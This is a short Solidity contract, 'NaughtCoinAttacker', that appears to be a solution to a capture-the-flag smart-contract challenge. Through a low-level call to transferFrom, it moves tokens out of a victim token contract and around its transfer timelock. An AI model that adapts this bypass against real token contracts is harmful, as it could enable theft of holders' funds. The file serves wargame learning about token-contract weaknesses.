// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NaughtCoinAttacker {

    address victim;

    constructor(address target) payable {
        victim = target;
    }

    function attack(address _to, uint _amount) public {
        (bool success, ) = victim.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, _to, _amount)
        );
        require(success);
    }

}